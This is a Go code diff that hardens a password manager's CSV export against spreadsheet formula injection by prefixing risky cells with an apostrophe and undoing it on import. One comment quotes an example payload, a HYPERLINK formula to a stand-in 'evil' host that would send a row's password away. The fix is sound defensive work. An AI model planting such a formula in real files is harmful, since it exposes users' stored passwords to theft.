@@ -287,9 +287,9 @@ func ExportCSV(items []vault.Item) ([]byte, error) {
 		if it.Fav {
 			fav = "1"
 		}
-		rec := []string{it.Folder, fav, typ, it.Name, it.Notes, strings.Join(fields, "\n"), "0", uri}
+		rec := []string{csvSafe(it.Folder), fav, typ, csvSafe(it.Name), it.Notes, strings.Join(fields, "\n"), "0", csvSafe(uri)}
 		if it.Type == vault.TypeLogin {
-			rec = append(rec, it.User, it.Pass, it.TOTP)
+			rec = append(rec, csvSafe(it.User), it.Pass, it.TOTP)
 		} else {
 			rec = append(rec, "", "", "")
 		}
@@ -299,6 +299,37 @@ func ExportCSV(items []vault.Item) ([]byte, error) {
 	}
 	w.Flush()
 	return buf.Bytes(), w.Error()
+}
+
+// formulaStart reports whether a spreadsheet would read a cell starting like s as a formula.
+func formulaStart(s string) bool {
+	return s != "" && strings.ContainsRune("=+-@\t\r", rune(s[0]))
+}
+
+// guarded reports whether csvSafe changes s: a formula start after any number of 's (so a
+// value that already looks guarded is guarded once more and the round trip stays exact).
+func guarded(s string) bool { return formulaStart(strings.TrimLeft(s, "'")) }
+
+// csvSafe defuses CSV formula injection (a cell such as =HYPERLINK("https://evil/?"&J2) that
+// a spreadsheet would run, sending the row's password away) in the columns a web page can
+// influence through raypass.save_login or a hostile import: folder, name, login_uri and
+// login_username get a leading ' when they start with = + - @ tab or CR. Passwords, TOTP
+// secrets, notes and fields are written as they are: changing a secret would corrupt it in the
+// manager the file is meant for, and notes often start with "-". Raypass's own CSV import
+// removes the ' again (unCSVSafe), so a round trip is exact.
+func csvSafe(s string) string {
+	if guarded(s) {
+		return "'" + s
+	}
+	return s
+}
+
+// unCSVSafe undoes csvSafe.
+func unCSVSafe(s string) string {
+	if strings.HasPrefix(s, "'") && guarded(s[1:]) {
+		return s[1:]
+	}
+	return s
 }
 
 // Filename is the suggested file name of an export.
